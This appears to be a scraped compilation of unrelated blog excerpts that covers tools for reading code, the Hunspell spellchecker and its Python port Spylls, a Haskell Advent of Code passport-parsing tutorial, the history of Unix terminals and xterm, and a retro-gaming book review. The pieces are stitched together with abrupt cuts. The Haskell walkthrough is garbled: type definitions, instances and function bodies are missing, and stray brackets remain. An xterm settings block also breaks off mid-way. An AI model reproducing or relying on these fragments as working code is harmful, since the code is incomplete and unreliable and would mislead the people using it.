<li>Once you have working code, <strong>improve its quality</strong>. Write a test (or a few) that document the changes in behavior you made. Refactor your code for clarity and style.</li>
</ol>
<p>This scientific approach guides us gradually toward correct, high quality code without having to understand each and every bit of code around our change.</p>
<h2>Tools</h2>
<p>While you could certainly get by with just a text editor and some patience, a wide variety of tools exist that help us read code more effectively throughout the process identified above.</p>
<h3>Identifying relevant code</h3>
<p>While step one gets easier over time as we build familiarity with some portion of code, we often begin step one completely lost. A few approaches are helpful here: running the code, project search, and code search.</p>
<p>Running the code helps you understand it. Before you start changing things, understand what already exists. This could mean reproducing a bug locally, finding the place in the UI where the new feature will go, or any number of other things. When you do, stepping through the execution in a debugger will give you a strong start on understanding what is going on.</p>
<p>By "project search," I mean searching artifacts created as part of the software development lifecycle. Particularly useful are issue trackers like JIRA/Asana/Pivotal Tracker, pull requests and issues in tools like GitHub and GitLab, and the git history itself. Because few tasks are truly novel, we can often gain understanding by looking for similar past work. Try several different keywords. Sometimes you'll find a pull request that implements something very similar to what you want to do, and you can use that as a guide. Trying to divine something from scratch, while sometimes necessary, requires significantly more effort than adapting from an example.</p>
<p>Code search is just what it sounds like. For code that you have checked out locally, I highly recommend using a tool specifically built for recursive search like ack, Silver Searcher (ag), or ripgrep. But you won't always have every bit of code at the company checked out locally, and sometimes it's useful to be able to search exhaustively. For this use case, tools like OpenGrok or Sourcegraph are super helpful. GitHub and GitLab also offer ways to search all code within a specific organization.</p>
<p>No matter which tool you're using, try several keywords you think might be relevant. Consider changing case sensitivity. You may have better results filtering down to specific file types.</p>
<h3>Understanding code</h3>
<p>Using these various search tools, we arrive at a set of relevant locations. Thus, we arrive into step two of our process: …</p></div>

    <h2 id="how-i-decided-to-write-a-spellchecker-and-almost-died-trying">How I decided to write a spellchecker and almost died trying</h2>

<p>A few years ago I had a fun idea for a “weekend project”: pure-Ruby spellchecker. Ruby is my language of choice, and no-dependencies spellchecker seemed a small useful tool for the CI environment: for example, to check comments/docs spelling without installing any third-party software. I actually <em>could’ve</em> pulled out the project in its limited scope (only English, only spot misspelled words without fixing, limited dictionary) with just a flat list of known words, but that’s not what happened.</p>

<p>Back then, I decided to make a moderately generic tool, at least able to work with multiple languages. Fortunately (or so I believed!), there were many already existing and freely available spellchecking dictionaries distributed as LibreOffice and Firefox extensions. All of those dictionaries are in the format defined by the <strong><a href="http://hunspell.github.io/">Hunspell</a></strong> tool/library—which is an open-source library that is used for spellchecking in Libre/OpenOffice, Mozilla products (Firefox, Thunderbird), but also Google Chrome/Chromium, macOS, several Adobe products, and so on.</p>

<p>The dictionaries looked like easy to reuse text files with some (“insignificant” as it seemed) metadata, and the whole “use Hunspell dictionaries from pure Ruby spellchecker” project <em>still</em> felt like a “weekend-long” one, for the first few weekends. Only gradually the underwater complexity of the multilanguage word-by-word spellchecking uncovered. Eventually, I was distracted from the project and abandoned it, but I still had the fascination with the seemingly-simple, actually-mind-blowingly-complicated Hunspell, the software everybody used daily and hardly ever notice.</p>

<p>The idea to dig deeper into it, to <em>understand</em> it and <em>explain</em>, grew on me and bothered me for quite some time. And what is a better way to understand something, if not to retell it in your own words? After several lazy and not very far-progressed attempts to write something Hunspell-alike (twice in Ruby, once in Rust, once in Python), eventually, in February 2020, the task I settled down to solve is: “explanatory rewrite” of the Hunspell into high-level language with a lot of comments. I achieved this goal by December 2020, with the first release of the <a href="https://github.com/zverok/spylls">Spylls</a> project: <strong>the port of Hunspell’s core algorithms into modern, well-documented, well-structured Python</strong>.</p>

<p>And now I want to share some insights of what I uncovered on the road: about spellchecking in general and Hunspell in particular.</p>

<p>In the ongoing article series, I’ll cover these topics:</p>

<ul>
  <li>What is Hunspell, why is it significant, and why try to “explain” it (current article)</li>
  <li>Base spellchecking concepts: lookup and suggest, as seen by Hunspell</li>
  <li>How lookup (checking if the word is correct) works, and why it could be much more complicated than “just look in the list of the known words”</li>
  <li>How suggest (proposed fix for the incorrect word) works, and how hard it is to estimate its quality</li>
  <li>A closer look into Hunspell’s dictionary format. It is the most widespread open dictionary format in the world, and we’ll see what linguistic and algorithmic information it <em>potentially</em> can carry, and what part of it is actually used in existing dictionaries</li>
  <li>Some details on Spylls implementation process and results</li>
  <li>Closing thoughts on the big picture of word-by-word spellchecker problem, and Hunspell’s approach to it</li>
</ul>

<h3 id="what-is-hunspell">What is Hunspell?</h3>

<blockquote>
  <p><strong>Note:</strong> The information on Hunspell’s origins and history is mostly my guesses, following partial and incomplete sources everywhere.</p>
</blockquote>

<p>Hunspell (<small><a href="https://en.wikipedia.org/wiki/Hunspell">Wikpedia article</a></small>), initially <strong>Hun</strong>garian spellchecker, emerged as an alternative for previously existing aspell/ispell/myspell somewhere in 2002 (I guess?). It was created by László Németh, in a need of supporting languages with complicated suffixing/prefixing rules and word compounding (such as Hungarian). Hunspell’s design seemingly proved itself to be flexible enough to support most of the world’s languages, and in a few years, it became the most used spellchecker in the world. You have most probably used it even if you’ve never heard the name before today: Hunspell is the default spellchecking engine in Chrome and Firefox, Libre/OpenOffice, Adobe products, and macOS (not an exhaustive list). Dictionaries in Hunspell format exist for almost all actively used languages for which the concept of word-by-word spellchecking makes sense<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<p>Currently, Hunspell is maintained <a href="https://github.com/hunspell/hunspell">on GitHub</a> (repo has only around 1k stars, will you believe it?). It seems that maintenance is not that easy if you’ll weight the number of open issues and PRs, and the latest commits timeline: at the time of writing it (Jan 2021), the last commit to master was of May 2020, and the last release was 1.7 on Dec 2018. Hunspell’s codebase is mostly “old-school” C++. It is being slowly modernized and it has very few comments; there are thousands of two-branch <code>if</code>s to handle non-Unicode and Unicode text separately. There is also an attempt to rewrite Hunspell from scratch in a modern C++, which at some point was developed under the <code>hunspell</code> GitHub organization. Now it is independent and called <a href="https://github.com/nuspell/nuspell">nuspell</a> (and, while not yet supporting all of the Hunspell features, already “achieved” version 4.2.0).</p>

<p>Obviously, there are open-source spellcheckers other than Hunspell. GNU aspell (that at one point was superseded by Hunspell, but still holds its ground in English suggestion quality), to name one of the older ones; but also there are novel approaches, like <a href="https://github.com/wolfgarbe/SymSpell">SymSpell</a>, claiming to be “1 million times faster” or ML-based <a href="https://github.com/bakwc/JamSpell">JamSpell</a>, claiming to be much more accurate.</p>

<p>And yet, what makes Hunspell stand out is its coverage of the world’s languages. It is not ideal, but the amount of dictionaries ready to use immediately, and amount of <em>experience</em> of dealing with typical problems and corner cases, coded into the codebase, is hard to beat.</p>

<h3 id="why-rewrite-it">Why rewrite it?</h3>

<p>As I’ve already stated above, the goal of the Spylls project was to create an <em>explanatory</em> rewrite: E.g., the “retelling” of how Hunspell works in a way that is easy to follow and to play with.</p>

<p>The necessity of this approach came to me from three facts:</p>

<ol>
  <li>Hunspell is used almost everywhere and is taken for granted;</li>
  <li>It is much more complicated than one might naively expect;</li>
  <li>This complexity—and years of human work that was spent growing the project—is notoriously hard to follow through the Hunspell’s codebase and grasp in full.</li>
</ol>

<p>In other words, I wanted to <strong>make the knowledge behind Hunspell more open</strong>.</p>

<p>The way I have chosen was not, of course, the only one possible. I could’ve just read through the original code and write a series of articles (or, rather, a book?) on how it works. I could’ve thoroughly commented and republished the original source code. But I felt that <em>reimplementing</em> is the only way of understanding what’s and why’s of the algorithms (at least for somebody not being a Hunspell’s core developer); and that implementation in a high-level language will allow focusing on words and language-related algorithms, not memory management or fighting with Unicode.</p>

<blockquote>
  <p>Note that there are also a few “pragmatic” ports of Hunspell into other languages (in order to use it in environments where C++ dependency is undesireable), namely <a href="https://github.com/aarondandy/WeCantSpell.Hunspell">WeCantSpell.Hunspell</a> in C# and <a href="https://github.com/wooorm/nspell">nspell</a> in JS (very incomplete); and aforementioned <a href="https://github.com/nuspell/nuspell">nuspell</a> can also be considered a “port” (from legacy C++ to a modern one).</p>
</blockquote>

<h3 id="why-python">Why Python?</h3>

<p>My language of choice is Ruby. It was also the first language that I’ve tried to port Hunspell into. I’d be happy to proceed with Ruby if my goal has been just a “pragmatic” library. And yet, when I decided that my goal is to make the knowledge of Hunspell’s algorithms accessible to a wide audience, I understood that Ruby is not the best choice: language reputation (slightly esoteric and mostly-for-web) would make my project lest noticeable; and my preferred coding style (mix of OO and functional, with lots of small immutable domain objects and fluent chains of iterators), while allowing me to be very effective, would make the code less accessible to other languages users.</p>

<p>What I needed was a high-level language, with as low boilerplate as possible; as mainstream as possible; as easy to experiment with and prototype as possible. Without diving into too much argument here, Python and modern JavaScript seemed to be the most suitable options, and, to be honest, Python was just closer to my soul. So, here we are!</p>

<p>The code style is mostly imperative (as it corresponds to how Hunspell is structured), with large-ish, but clearly structured methods, and a small number of classes/objects (mostly they are either “whole algorithm as a class” or almost-passive “structs” – or, in Python, dataclasses). I tried to limit myself in the usage of complex Python-specific features (like functools or itertools), but have a decent use of “list comprehensions” (as they are quite readable and Pythonic) and generators (lazy lists). Overall, I wanted the code to be good Python, but not too smart. Whether I succeeded, is up to you to decide.</p>

<p>Currently, <a href="https://github.com/zverok/spylls">Spylls</a> has <strong>≈1.5k lines of library code</strong> in 14 files. It conforms (with <a href="https://spylls.readthedocs.io/en/latest/#completeness">some reservations</a>) to all Hunspell’s integrational tests. Those tests look like a set of files each, consisting of “test dictionary + what words should be considered good, what words should be considered bad, what should be suggested instead of the bad words”, and there are <strong>127 of such sets to pass</strong>. There are <strong>2 thousand comment lines</strong> in the code, explaining thoroughly every detail of the algorithm and rendered at the <a href="https://spylls.readthedocs.io/en/latest/hunspell.html">Spylls documentation site</a>; note that besides docstrings at the beginning of each class and method, there are also inline comments in code—that’s why the documentation site uses custom theme with inline “Show code” feature.</p>

<hr>

<p>With this being said, I am wrapping up the introductory post.</p>

<p><strong>In the <a href="https://zverok.github.io/blog/2021-01-09-spellchecker-2.html">next series</a>: An introduction to Hunspell’s “lookup” and “suggest” concepts; and deeper dive into the lookup.</strong></p>

January 15, 2021 | https://juliu.is/permutate-parsers/ | <a href="https://web.archive.org/web/*/https://juliu.is/permutate-parsers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/">“Parse, don’t
validate”</a>
has been one of my favourite programming articles for some time. The main
gist of the article is that, when writing in a type-driven fashion, your
snappy slogan should be:</p>
<blockquote>
<p>Parse, don’t validate.</p>
</blockquote>
<p>The core difference between parsing and validating can be explained by
looking at two very similar functions:</p>
<div data-language="haskell"><pre><code><span>parseInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Maybe</span> <span>Int</span>
<span>parseInt</span> <span>str</span> <span>=</span> <span>Text.Read.readMaybe</span> <span>str</span>

<span>validateInt</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Bool</span>
<span>validateInt</span> <span>str</span> <span>=</span> <span>Text.Read.readMaybe</span> <span>str</span> <span>/=</span> <span>Nothing</span></code></pre></div>
<p>As you can see, they look very similar. The main difference is that
<code>parseInt</code> returns a useful value, the <code>Int</code> that we wanted to parse, while
<code>validateInt</code> takes that useful value and throws it away. This is also
mentioned in the wonderful <a href="https://kowainik.github.io/posts/haskell-mini-patterns#evidence">Haskell Mini-Patterns
Handbook</a>
as the “Evidence” pattern.</p>
<blockquote>
<p>The key issue here is that by calling a function that returns Bool you
lose the information about earlier performed validation. Instead, you can
keep this information by explicitly pattern-matching on the validation or
result.</p>
</blockquote>
<p>In this post, I would like to go through a practical example that shows the
power of bringing this concept to its limits. Which brings us to…</p>
<h2>Advent of Code 2020, Day 4</h2>
<p>We <a href="https://adventofcode.com/2020/day/4">are tasked</a> with parsing a batch
of passports composed of these fields:</p>
<div data-language="plain"><pre><code>- byr (Birth Year)
- iyr (Issue Year)
- eyr (Expiration Year)
- hgt (Height)
- hcl (Hair Color)
- ecl (Eye Color)
- pid (Passport ID)
- cid (Country ID)</code></pre></div>
<p>All the fields are required except for the <code>cid</code> field, which is optional.
Note that the fields can be written in any order, this will be important
later. Our batch is composed of multiple passports separated by empty lines
(the <code>input.txt</code>):</p>
<div data-language="plain"><pre><code>ecl:gry pid:860033327 eyr:2020 hcl:#fffffd
byr:1937 iyr:2017 cid:147 hgt:183cm

iyr:2013 ecl:amb cid:350 eyr:2023 pid:028048884
hcl:#cfa07d byr:1929

hcl:#ae17e1 iyr:2013
eyr:2024
ecl:brn pid:760753108 byr:1931
hgt:179cm

hcl:#cfa07d eyr:2025 pid:166559648
iyr:2011 ecl:brn hgt:59in</code></pre></div>
<ul>
<li>The first passport is <em>valid</em> - all required fields are present.</li>
<li>The second passport is <em>invalid</em> - it is missing <code>hgt</code>.</li>
<li>The third passport is interesting: the only missing field is the optional <code>cid</code>, which makes it <em>valid</em>.</li>
<li>The fourth passport is missing two fields, <code>cid</code> and <code>byr</code>. Missing <code>cid</code> is fine, but missing <code>byr</code> is not, so this passport is <em>invalid</em>.</li>
</ul>
<p>The challenge is to count <strong>how many passports</strong> are <strong>valid</strong> in the given
batch.</p>
<p>Let’s write some code to open the file and parse each group of passport
fields:</p>
<div data-language="haskell"><pre><code><span>module</span> <span>Main</span> <span>where</span>

<span><span>import</span> <span>qualified</span> Data.List.Split <span>as</span> S</span>

<span>main</span> <span>::</span> <span>IO</span> <span>(</span><span>)</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>contents</span> <span>&lt;-</span> <span>readFile</span> <span>"input.txt"</span>
  <span>let</span> <span>entries</span> <span>=</span> <span>map</span> <span>parseEntry</span> <span>(</span><span>S.splitOn</span> <span>"\n\n"</span> <span>contents</span><span>)</span>
  <span>print</span> <span>entries</span>

<span>data</span> <span>PassportEntry</span> <span>=</span> <span>PassportEntry</span>
  <span>deriving</span> <span>(</span><span>Show</span><span>)</span>

<span>parseEntry</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>PassportEntry</span>
<span>parseEntry</span> <span>text</span> <span>=</span> <span>undefined</span></code></pre></div>
<p>Nothing too fancy here, we’re using <code>Data.List.Split</code> from the <code>split</code>
package to do the heavy lifting. And the implementation of <code>parseEntry</code> has
been conveniently stubbed so that the code compiles.</p>
<p>Now how should our <code>PassportEntry</code> data structure look like? I’d love to
eventually represent passports as:</p>
<div data-language="haskell"><pre><code><span>data</span> <span>Passport</span> <span>=</span> <span>Passport</span>
  <span>{</span> <span>birthYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>issueYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>expirationYear</span> <span>::</span> <span>Int</span><span>,</span>
    <span>height</span> <span>::</span> <span>String</span><span>,</span>
    <span>hairColor</span> <span>::</span> <span>String</span><span>,</span>
    <span>eyeColor</span> <span>::</span> <span>String</span><span>,</span>
    <span>passportId</span> <span>::</span> <span>String</span><span>,</span>
    <span>countryId</span> <span>::</span> <span>Maybe</span> <span>Int</span>
  <span>}</span></code></pre></div>
<p>If we imagine parsing each field sequentially, we can see that we won’t be
able to construct this data structure in a single operation. We’ll have to
accumulate the data up until we’re ready to create a proper <code>Passport</code>.</p>
<p>One way to store the fields is to insert them into a hash. First of all,
we’re going to use a custom data type to represent the keys of the hash.
Why is that? We really don’t want to be making typos later when comparing
raw strings like <code>"ecl"</code> and <code>"elc"</code>. We’ll use a <code>HashMap</code> from the
<code>Data.HashMap.Strict</code> module:</p>
<div data-language="haskell"><pre><code><span><span>import</span> <span>qualified</span> Data.HashMap.Strict <span>as</span> HM</span>

<span>data</span> <span>PassportField</span>

<p>Of course things can’t be that easy. We also need to make our type
implement the <code>Hashable</code> typeclass:</p>
<div data-language="haskell"><pre><code>

<span><span>import</span> <span>qualified</span> Data.HashMap.Strict <span>as</span> HM</span>
<span><span>import</span> Data.Hashable</span>

<p>Don’t worry about what we’ve added. Just take them as God-given truths. 👼</p>
<p>Okay, now we can implement our <code>parseEntry</code> function:</p>
<div data-language="haskell"><pre><code><span><span>import</span> Data.Maybe</span> <span>(</span><span>mapMaybe</span><span>)</span>

<p>We try to parse each field (such as <code>byr:2002</code>) into a <code>PassportField</code>
type, then end up building a hash using <code>HM.fromList</code>. We can take this for
a spin:</p>

    <span>]</span>
<span>]</span></code></pre></div>
<p>Nice and tidy! 🦾</p>
<p>Now our goal is to verify which one of these groups is valid. First of all,
we should define a list of required fields:</p>
<div data-language="haskell"><pre><code><span>requiredFields</span> <span>::</span> <span>[</span><span>PassportField</span><span>]</span>
<span>requiredFields</span> <span>=</span>
  <span>[</span> <span>BirthYear</span><span>,</span>
    <span>IssueYear</span><span>,</span>
    <span>ExpirationYear</span><span>,</span>
    <span>Height</span><span>,</span>
    <span>HairColor</span><span>,</span>
    <span>EyeColor</span><span>,</span>
    <span>PassportId</span>
  <span>]</span></code></pre></div>
<p>We can then define a validation function:</p>
<div data-language="haskell"><pre><code><span>isEntryValid</span> <span>::</span> <span>PassportEntry</span> <span>-&gt;</span> <span>Bool</span>
<span>isEntryValid</span> <span>entry</span> <span>=</span>
  <span>all</span> <span>(</span><span>`HM.member`</span> <span>entry</span><span>)</span> <span>requiredFields</span></code></pre></div>
<p>And change our main function to use that:</p>
<div data-language="haskell"><pre><code><span>main</span> <span>::</span> <span>IO</span> <span>(</span><span>)</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>contents</span> <span>&lt;-</span> <span>readFile</span> <span>"input.txt"</span>
  <span>let</span> <span>entries</span> <span>=</span> <span>map</span> <span>parseEntry</span> <span>(</span><span>S.splitOn</span> <span>"\n\n"</span> <span>contents</span><span>)</span>
  <span>print</span> <span>$</span> <span>length</span> <span>$</span> <span>filter</span> <span>isEntryValid</span> <span>entries</span></code></pre></div>
<p>Running this yields <code>2</code>, which is the correct answer!
<a href="https://gist.github.com/Arkham/b749043e1622bf01c96eefe303df0b9b">Here</a> is
all the code we have written so far, if you’re feeling like you need a
refresher.</p>
<h2>Advent of Code 2020, Day 4, Part II</h2>
<p>In the second part of the challenge, these new rules are added:</p>
<div data-language="plain"><pre><code>- byr (Birth Year) - four digits; between 1920 and 2002.
- iyr (Issue Year) - four digits; between 2010 and 2020.
- eyr (Expiration Year) - four digits; between 2020 and 2030.
- hgt (Height) - a number followed by either cm or in:
  - If cm, the number must be between 150 and 193.
  - If in, the number must be between 59 and 76.
- hcl (Hair Color) - a '#' followed by six chars 0-9 or a-f.
- ecl (Eye Color) - one of: amb blu brn gry grn hzl oth.
- pid (Passport ID) - a nine-digit number.
- cid (Country ID) - ignored, missing or not.</code></pre></div>
<p>Here is a new batch for us to peruse:</p>
<div data-language="plain"><pre><code>pid:087499704 hgt:74in ecl:grn iyr:2012 eyr:2030 byr:1980
hcl:#623a2f

eyr:1972 cid:100
hcl:#18171d ecl:amb hgt:170 pid:186cm iyr:2018 byr:1926</code></pre></div>
<ul>
<li>the first passport is <em>valid</em></li>
<li>the second passport is <em>invalid</em> (look at the <code>eyr</code> field)</li>
</ul>
<p>These new requirements are a bit annoying. Our simple approach of checking
if all required fields are present won’t work any longer. We can instead
implement a <code>isFieldValid</code> function to check if all fields are valid.</p>
<div data-language="haskell"><pre><code><span>isFieldValid</span> <span>::</span> <span>(</span><span>PassportField</span><span>,</span> <span>String</span><span>)</span> <span>-&gt;</span> <span>Bool</span>

<p>Then we can change our <code>isEntryValid</code> to use this function:</p>
<div data-language="haskell"><pre><code><span>isEntryValid</span> <span>::</span> <span>PassportEntry</span> <span>-&gt;</span> <span>Bool</span>
<span>isEntryValid</span> <span>entry</span> <span>=</span>
  <span>requiredFieldsPresent</span> <span>&amp;&amp;</span> <span>allFieldsValid</span>
  <span>where</span>
    <span>requiredFieldsPresent</span> <span>=</span>
      <span>all</span> <span>(</span><span>`HM.member`</span> <span>entry</span><span>)</span> <span>requiredFields</span>

    <span>allFieldsValid</span> <span>=</span>
      <span>all</span> <span>isFieldValid</span> <span>(</span><span>HM.toList</span> <span>entry</span><span>)</span></code></pre></div>
<p>Running this program on our second data sample yields <code>1</code>, and it will be
good enough to solve the Advent of Code challenge and get us those sweet
sweet stars.</p>

<p>The other day, as I was going through some of my old notes, I stumbled upon something I had written about the console, the terminal and the shell on Unix-like operating systems. I have decided to rewrite these notes in order to share them here on my website. So without further ado we will now stroll down memory lane and take a quick look at the origins of the Unix terminal and shell. And I will also give my advice to new users on Linux or BSD regarding the choice of terminal emulator and shell.</p>

<h2 id="the-terminal-and-the-console">The terminal and the console</h2>

<p>Early computers where huge machines that consisted of multiple cabinets, e.g. one cabinet for the CPU, one or more cabinets for tape drives, one cabinet for each disk drive, one cabinet for a punched card reader and one cabinet for a high speed printer. The image below is a Univac 9400 system from 1967 consisting of several cabinets.</p>

<p>The "console" was the "control console". In the pictures below is a "UNIVAC 1" control console and a "UNIVAC 2" control console.</p>

<p>The word terminal comes from the Latin "terminus", meaning "an end, a limit, boundary line", indicating that it's the terminating end or "terminal" end of a communications process. You will sometimes hear the description "a dumb terminal" when referring to a text-based environment where the computer is <i>just taking input and showing text</i> while the real work happens at the other end, typically in a <a href="https://en.wikipedia.org/wiki/Mainframe_computer">mainframe</a>.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Teleprinter">teleprinter</a> or TTY was the first kind of terminal. Rather than a monitor you would have a literal typewriter in front of you. When you typed on it, you would see the text on a piece of paper and that text would be send to the computer. When the computer replied, you would see the typewriter print on the paper. Some models could also be used to create punched tape for data storage (either from typed input or from data received from a remote source) and to read back such tape for local printing or transmission.</p>

<p>In the picture below is a Teletype 33 ASR Teleprinter. It was introduced in 1963 as an electro-mechanical teleprinter and it was one of the most popular terminals in the communications industry. The ASR stands for <b>A</b>utomatic <b>S</b>end and <b>R</b>eceive. The ASR 33 had a built-in punched tape reader and tape punch which allowed the user to save programs.</p>

<p><b>NOTE:</b><br>If you're interested I can highly recommend that you take a look at Charles Baetsen's Hobby Page as he has a wealth of information about the <a href="https://va3ngc.weebly.com/asr-33-documentation.html">Teletype 33 ASR</a> in the form of both user manuals, installations manuals and videos.</p>

<p>In the picture below Ken Thompson (sitting) and Dennis Ritchie (standing) is using a 33 ASR teleprinter connected to a <a href="https://en.wikipedia.org/wiki/PDP-11">PDP-11</a>, the picture is from 1972.</p>

<p>Later, as computers became much smaller, it was possible to integrate multiple components into one single unit, with both a video monitor and a keyboard put together inside it, and the "console" now became more or less synonymous to the "terminal". Both the "console" and the "terminal" now referred to the physical video terminal that had replaced both the teleprinter and the old control console.</p>

<p>The video terminal provides a way for the kernel and other processes to send text output on the monitor to the user, and to receive text input from the user via the keyboard.</p>

<p>The VT100 is a video terminal, introduced in August 1978 by Digital Equipment Corporation (DEC). It was one of the first terminals to support ANSI escape codes for cursor control and other tasks, and added a number of extended codes for special features like controlling the status lights on the keyboard. This led to rapid uptake of the ANSI standard, becoming the de facto standard for terminal emulators.</p>

<p><img src="https://www.unixsheikh.com/includes/images/dec-vt100.jpg" alt="DEC VT100"><br><span>A DEC VT100</span></p>

<p>The VT220 is an ANSI standard video terminal introduced by Digital Equipment Corporation (DEC) in November 1983. The VT240 added monochrome vector graphics support to the base model, while the VT241 did the same in color. The 200 series replaced the VT100 series. Among its major upgrades was a number of international character sets, as well as the ability to define new character sets, and a much lighter keyboard.</p>

<p>Today, in the software world, "console" and "terminal" has become completely synonymous.</p>

<h3 id="the-virtual-terminal">The virtual terminal</h3>

<p>A virtual terminal or virtual console is a program that simulates a physical terminal. For example, both the Linux kernel and BSD kernels support virtual terminals - terminals that are logically separate, but which access the same physical keyboard and monitor.</p>

<p>The virtual terminal gives the impression that several independent terminals are running concurrently. Each virtual terminal can be logged in with a different user and it can run its own shell and have its own font settings. The virtual terminals each use a device <code>/dev/ttyX</code>, and you can switch between them by pressing <code>Alt+FX</code> (where <code>X</code> is equal to the virtual terminal number, beginning with 1).</p>

<h2 id="the-terminal-emulator">The terminal emulator</h2>

<p>Emulation refers to the ability of a computer program to emulate, i.e. imitate, another program or device. A terminal emulator is a computer program that emulates a physical terminal within some other display architecture, such as the <a href="https://en.wikipedia.org/wiki/X_Window_System">X Window System</a>.</p>

<p>Many different terminal emulators have been developed that emulate terminals such as the <a href="https://en.wikipedia.org/wiki/VT52">VT52</a>, <a href="https://en.wikipedia.org/wiki/VT100">VT100</a>, <a href="https://en.wikipedia.org/wiki/VT220">VT220</a>, <a href="https://en.wikipedia.org/wiki/VT320">VT320</a>, <a href="https://en.wikipedia.org/wiki/IBM_3270">IBM 3270/8/9/E</a>, <a href="https://en.wikipedia.org/wiki/IBM_5250">IBM 5250</a>, and many others.</p>

<p>The terminal emulator takes the input you type at the keyboard and convert those to <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> characters which it sends to the shell, or to a program running under the shell (more about the shell later). The terminal emulator also takes the stream of output characters from the various programs you run via the shell and displays them on the monitor.</p>

<p>The purpose of the terminal emulator is to allow access to the command line while working in a graphical user interface, such as the X Window System. Since the shell is "expecting" to interface with a human through a terminal, and we don't use a physical terminal while in a graphical environment, we need the terminal emulator.</p>

<p>You can see what terminal types are available on most Linux distributions by running <code>ls /lib/terminfo/*</code> (the path may be different on your system). On OpenBSD it's <code>ls /usr/share/terminfo/*</code></p>

<h4 id="xterm">xterm</h4>

<p><a href="https://invisible-island.net/xterm/xterm.html">xterm</a> was originally written as a stand-alone terminal emulator for the <a href="https://en.wikipedia.org/wiki/VAXstation#VAXstation_100">VAXStation 100 </a> (VS100) by Mark Vandevoorde, a student of <a href="https://en.wikipedia.org/wiki/Jim_Gettys">Jim Gettys</a>, who worked at <a href="https://en.wikipedia.org/wiki/Digital_Equipment_Corporation">DEC's</a> Cambridge Research Laboratory. It became clear that xterm would be more useful as part of X Window System than as a standalone program, so it was retargeted to the X Window System.</p>

<p>The xterm program is the default terminal emulator for the X Window System. It provides DEC VT102/VT220 features and other selected features from higher-level terminals such as VT320, VT420 and VT520. It also provides Tektronix 4014 emulation for programs that cannot use the window system directly. If the underlying operating system supports terminal resizing (for example, the SIGWINCH signal in systems derived from 4.3bsd), xterm will use the facilities to notify programs running in the window whenever it is resized.</p>

<p>Around 1996 the main line of development shifted to the <a href="https://en.wikipedia.org/wiki/XFree86">XFree86</a> implementation of the X Window System and xterm is now maintained by Thomas Dickey, who is also the current lead developer of <a href="https://en.wikipedia.org/wiki/Lynx_%28web_browser%29">Lynx</a>, a popular customizable text-based web browser.</p>

<p>Early versions of xterm emulated the VT102 and Tektronix 4014. Later versions added control sequences for DEC and other terminals such as:</p>
<ul>
    <li>VT220: Added in patch 24.</li>
    <li>VT320: Added in patch 24.</li>
    <li>VT420: DECSTR (soft terminal reset) was added in patch 34.</li>
    <li>VT520: Although not officially emulated, parts of VT520 features were implemented. Controls DECSMBV and DECSWBV for setting the margin- and warning-bell volume was added in patch 254.</li>
</ul>

<p>As with most X applications, xterm can be customized via global X resources files (e.g. <code>/usr/lib/X11/app-defaults/XTerm</code>), per-user resource files (e.g. <code>~/.Xresources</code>), or command-line arguments. Most of the command-line options correspond to resource settings, as noted in the <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a>.</p>

<p>While the name of the program is xterm, the X resource class in <code>~/.Xresources</code> is <code>XTerm</code>, e.g.:</p>

<pre>XTerm*utf8: 1</pre>

<p>The <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a> provides a full list of features and options.</p>

<p>xterm is still being actively developed, it works really great across many different systems, it has extremely low input latency, it has many hidden gems and it is my favorite terminal emulator! For that reason I'm going to share some settings you can use in your <code>~/.Xresources</code> file:</p>

<pre>XTerm*faceName: "DejaVu Sans Mono"

<p>Towards the end of of 1985, adverts started appearing in my Computer &amp; Video Games magazines for “the first ever computer cartoon” – Scooby Doo in the Castle Mystery! And to a massive Scooby Doo fan like me, it was incredible! They were clearly Spectrum screenshots on there, but they definitely looked like nothing else, except maybe what a Spectrum port of something like Dragon’s Lair might look like… which, the following year, we’d find out was more or less the case!</p>

<p>Anyway, as 1985 became 1986, previews started appearing that hinted at an interactive story involving a spooky Scottish castle belonging to Shaggy’s aunt, presented as cartoon action sequences that you directed to solve the mystery. And yes, it really was like a laser-disc game crammed into a 48K Spectrum! As the months passed, the big double-page, full colour adverts kept coming, but no sign of any game, then in March 1986, in an Elite preview exclusive, C&amp;VG said “despite what you’ve read in other magazines, Elite still plans to release its computer cartoon adventure, Scooby Doo in the Castle Mystery for the 48K Spectrum,” but towards the end of the article also says that it won’t be in the “heavily advertised” form because there wasn’t enough memory left to make it playable! And, of course, what we eventually got at the end of 1986 was the fantastic, but utterly brutal Scooby Doo, an arcade-platformer take on Kung-Fu Master, with some of my favourite graphics ever on the Spectrum! </p>

<p>As much as I love what we finally got, I still look at the original advert and wonder what could have been… And I would have gotten away with it too, if it weren’t for you meddling 48K of memory! If only Sir Clive had come up with 128K a bit sooner it might all be different, but that’s the tale of my very first encounter with a game that weren’t. Wasn’t!</p>



<p>Fast forward to Christmas 2021, and I received a wonderful new book called The Games That Weren’t, written by Frank Gasking and published by my favourite retro-gaming book peddlars Bitmap Books, who are responsible for all kinds of equally wonderful stuff on my bulging bookshelves, but nothing that bulges quite as much as this 644-page hardback behemoth!</p>

<p>As someone that writes about games from time to time, I think I’m qualified to say that everything about this puts me to shame! The first thing you notice, the very first time you flick through it, is that it’s clearly an absolute labour of love, much like Frank’s website of the same name that he started way back in the nineties to document and find lost and unreleased games across many platforms. The next thing you notice is that it’s visually stunning – even more so than Scooby Doo in the Castle Mystery! And then you realise that it’s so much more than that…</p>

